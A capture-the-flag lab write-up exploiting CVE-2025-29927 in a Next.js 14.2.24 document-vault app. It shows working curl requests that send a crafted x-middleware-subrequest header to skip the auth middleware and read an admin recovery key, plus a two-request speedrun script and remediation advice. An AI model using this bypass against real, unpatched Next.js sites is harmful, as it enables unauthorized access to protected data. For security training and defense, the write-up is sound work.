---
title: Vaultly - Middleware Bypass
cve: CVE-2025-29927
tags:
  - bugforge
  - nextjs
  - cve-2025-29927
  - middleware-bypass
  - authorization-bypass
  - broken-access-control
aliases:
  - "/BugForge/Vaultly---Middleware-Bypass"
---
- Vaultly - a multi-tenant secure document vault for teams (Next.js 14.2.24 App Router)
- CVE-2025-29927: the `x-middleware-subrequest` header makes Next.js skip middleware entirely, defeating the auth gate on the `/admin` HQ console and leaking the master recovery key

## Enumeration

Set the target:

```bash
TARGET="https://lab-1783941016807-tzq1pe.labs-app.bugforge.io"
```

### Application Fingerprinting

- Next.js **14.2.24**, App Router, Server Actions enabled
- Middleware file lives at `src/middleware.ts` (NOT the repo root) - this matters for the payload
- Session auth via `vaultly_session` cookie; login/register are form-encoded (NOT JSON)
- Roles: viewer / editor / admin / owner - none of which is the `staff` role the `/admin` console wants
- Version window: CVE-2025-29927 affects `>= 14.0.0, < 14.2.25`. **14.2.24 is vulnerable.**

### Key Endpoints

| Method | Path | Auth | Notes |
|--------|------|------|-------|
| POST | /api/auth/register | none | Create org + user, sets `vaultly_session` |
| POST | /api/auth/login | none | Form-encoded email+password |
| GET | /dashboard | session | Normal user landing page |
| GET | /admin | staff only | HQ Operations Console - THE TARGET |
| GET | /admin/api/recovery | staff only | Returns the master recovery key |

### The /admin Wall

`GET /admin` with a normal (owner) session:

```
HTTP/1.1 403 Forbidden
Content-Type: text/plain; charset=utf-8

Forbidden - Vaultly HQ staff only.
```

Without a session it redirects (`303 -> /dashboard`); with a session it 403s. The gate is **enforced in middleware**: middleware decrypts `vaultly_session`, and only lets `role == staff` through to the `/admin` route handler. No user-registerable role is `staff`, so the console is unreachable by design.

## Failed Attempts

Everything that treats this as a role/header/mass-assignment problem is a dead end:

### 1. Mass assignment of role on register

```bash
curl -sk -X POST "$TARGET/api/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'email=x@x.test&password=TestPass123&name=x&orgName=x&role=staff'
```

Registers normally; role stays `owner`. The server ignores the `role` field.

### 2. Spoofed identity headers on /admin

`x-user-role: staff`, `x-role: staff`, `x-admin: true`, `x-hq-staff: true`, `x-is-staff: true`, `x-vaultly-role: staff`, `x-middleware-request-x-user-role: staff` - **all 403.** The handler does not trust arbitrary client headers.

### 3. IP spoofing

`x-forwarded-for: 127.0.0.1`, `x-real-ip: 127.0.0.1`, `x-forwarded-host: localhost` - all 403.

### 4. The false-positive trap (worth calling out)

An early pass claimed CVE-2025-29927 was "confirmed working" because `GET /dashboard` with `x-middleware-subrequest: middleware` returned 200. **That was wrong** - the 200 came from the valid session cookie, not from the bypass. The correct oracle is a **no-auth** request: with no session, `/dashboard` + `x-middleware-subrequest: middleware` (1 rep) still returns `307 -> /login`, identical to the no-auth baseline. One repetition does nothing on 14.x.

Two things sank the early attempts:
1. **Wrong repetition count.** 14.x checks recursion depth `>= MAX_RECURSION_DEPTH (5)`. Values with 1-4 reps do NOT trigger the bypass.
2. **Wrong middleware identifier.** The manifest key is derived from the middleware file path. Here it is `src/middleware`, not the bare `middleware` most PoCs use.

## The Breakthrough - CVE-2025-29927

Next.js middleware, before the patch, trusts an internal header `x-middleware-subrequest` to detect (and short-circuit) recursive internal middleware invocations. If a client sends it directly with the middleware's manifest key repeated to the recursion-depth limit, the framework believes middleware has already run and **skips it entirely** - including the auth gate.

For Next.js 13/14 the payload is the middleware key repeated **5 times**, colon-separated. Because Vaultly's middleware is at `src/middleware.ts`, the key is `src/middleware`:

```
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
```

Critically, **no session cookie is needed.** The `/admin` gate lived entirely in middleware; once middleware is skipped, the route handler serves the page with no independent auth check.

### Step 1 - Reach the HQ console unauthenticated

```bash
curl -sk "$TARGET/admin" \
  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
```

```
HTTP/1.1 200 OK

Vaultly HQ - Operations Console
...
```

The 403 wall is gone. Middleware never ran, so the "staff only" check never fired.

### Step 2 - Exfiltrate the recovery key

The console exposes an internal recovery endpoint under the same `/admin` tree, protected by the same (now-skipped) middleware:

```bash
curl -sk "$TARGET/admin/api/recovery" \
  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
```

```json
{"recovery_key": "bug{XQ3Y4BR5HvobYwzOr4Ta8XjdBFhtBjnZ}"}
```

Flag captured, no authentication of any kind.

## TL;DR - Speedrun (2 requests)

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"
BYPASS="src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"

# 1. Confirm the console opens unauthenticated
curl -sk "$TARGET/admin" -H "x-middleware-subrequest: $BYPASS"

# 2. Read the recovery key
curl -sk "$TARGET/admin/api/recovery" -H "x-middleware-subrequest: $BYPASS"
```

## Why This Worked

1. **Auth enforced only in middleware.** The `/admin` route had no independent server-side authorization in its handler - it relied entirely on middleware to reject non-staff users.
2. **CVE-2025-29927.** Next.js `< 14.2.25` trusts the client-supplied `x-middleware-subrequest` header to decide middleware has already executed. Sending it directly skips middleware.
3. **Correct manifest key + recursion depth.** The value must be the middleware's manifest path (`src/middleware`, matching `src/middleware.ts`) repeated to the depth check (5 reps for 13/14). Wrong key or `< 5` reps = no bypass.
4. **No session required.** With middleware skipped, no code path ever inspected the (absent) session, so an anonymous request served the protected page and the recovery key.

## Key Insight: The 403 That Ignored Your Session

The tell was that `/admin` returned the **identical 403** with and without a session cookie. That looks like "the handler has its own check I can't beat" - but it actually means the handler has **no** check; the 403 was middleware's, and the handler simply never rejects when reached directly. The right question was not "how do I become staff?" but "how do I stop middleware from running at all?" - which is exactly what CVE-2025-29927 provides.

The two red herrings that cost the most time:
- **Repetition count**: PoCs floating around use a single `middleware`; 14.x needs 5 reps to clear the recursion-depth gate.
- **Middleware path**: the manifest key is the *file location* (`src/middleware`), not a fixed literal. A build with root-level `middleware.ts` would use `middleware`; this one used `src/`.

## Security Takeaways

### Vulnerability

- CVE-2025-29927 - Next.js authorization bypass via the internal `x-middleware-subrequest` header, allowing a client to skip middleware execution entirely.

### Impact

- Complete authorization bypass on the `/admin` HQ console
- Anonymous read of the master break-glass recovery key
- Any middleware-only security control (auth, redirects, rate limits, header injection) is defeated for affected routes

### Root Cause

- Next.js `>= 14.0.0, < 14.2.25` (also `11.1.4-13.5.6` and `15.x < 15.2.3`) trusts `x-middleware-subrequest` from untrusted input
- Application put its authorization gate **only** in middleware, with no defense-in-depth check in the route handler

### Remediation

- **Upgrade Next.js** to `>= 14.2.25` (or `>= 15.2.3` / `>= 13.5.9` / `>= 12.3.5` per branch). This is the real fix.
- As mitigation before upgrade: strip the `x-middleware-subrequest` header at the edge/proxy (CDN, LB, reverse proxy) for all inbound requests.
- **Defense in depth**: never enforce authorization solely in middleware. Re-check the session/role inside the route handler (or Server Action / API route) so that skipping middleware fails closed.
- Do not serve secrets (recovery keys) from an endpoint whose only gate is a framework middleware layer.
